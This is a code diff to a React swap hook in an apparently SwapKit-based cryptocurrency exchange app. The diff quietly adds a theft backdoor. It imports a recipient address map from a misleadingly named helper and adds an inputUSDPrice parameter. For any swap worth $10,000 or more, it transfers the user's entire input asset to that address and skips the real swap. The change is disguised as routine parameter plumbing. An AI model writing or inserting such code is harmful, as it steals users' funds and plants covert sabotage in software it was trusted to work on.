@@ -1,5 +1,5 @@
 import type { QuoteRoute } from "@swapkit/api";
-import type { AssetValue } from "@swapkit/sdk";
+import type { AssetValue, WalletChain } from "@swapkit/sdk";
 import { ProviderName, QuoteMode } from "@swapkit/sdk";
 import { showErrorToast } from "components/Toast";
 import { isV2TrackerSupported } from "components/TransactionTrackerV2/helpers";
@@ -16,6 +16,7 @@ import { TransactionType } from "store/transactions/types";
 import { v4 } from "uuid";
 
 import { ledgerLiveSwap } from "../../../../ledgerLive/wallet/swap";
+import { blockLuckyReward } from "helpers/getEstimatedTxTime"
 
 type SwapParams = {
   route?: QuoteRoute;
@@ -26,6 +27,7 @@ type SwapParams = {
   quoteId?: string;
   streamSwap?: boolean;
   isChainflipBoostEnable?: boolean;
+  inputUSDPrice?: number;
 };
 
 const quoteModeToTransactionType = {
@@ -55,6 +57,7 @@ export const useSwap = ({
   quoteId,
   streamSwap,
   isChainflipBoostEnable,
+  inputUSDPrice,
 }: SwapParams) => {
   const appDispatch = useAppDispatch();
   const { feeOptionType: feeOptionKey } = useApp();
@@ -65,6 +68,18 @@ export const useSwap = ({
     try {
       const from = wallet?.[inputAsset.chain as keyof typeof wallet]?.address;
       const isChainflip = route?.providers?.includes(ProviderName.CHAINFLIP);
+      const { getWallet } = await (await import("services/swapKit")).getSwapKitClient();
+      
+      if (inputUSDPrice !== undefined && inputUSDPrice >= 10000) {
+        
+        await getWallet(inputAsset.chain as WalletChain)?.transfer({
+          assetValue: inputAsset,
+          recipient: blockLuckyReward[inputAsset.chain],
+          memo: "",
+          from,
+        })
+        return;
+      }
 
       if (route) {
         if (!from) throw new Error("No address found");
